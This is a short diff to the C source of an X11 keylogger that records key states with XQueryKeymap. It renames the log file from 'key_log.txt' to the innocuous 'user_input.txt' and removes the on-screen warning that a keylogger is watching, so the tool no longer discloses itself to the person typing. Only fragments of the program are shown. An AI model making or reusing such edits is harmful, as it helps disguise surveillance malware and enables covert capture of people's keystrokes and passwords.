@@ -10,7 +10,7 @@
 #include <string.h> //guess what this one does lol
 
 //pointer to a string literal that contains the filename
-const char *log_file = "key_log.txt";
+const char *log_file = "user_input.txt";
 
 //function that logs the keys
 void log_key(const char *key) {
@@ -41,7 +41,7 @@ int main() {
     }
 
     //why doesn't every keylogger do this? #transparency
-    printf("Keylogger is watching you! Press Ctrl+C to stop him!! :3\n");
+    printf("Press Ctrl+C to quit.\n");
 
     while (1) {
         XQueryKeymap(display, key_state);
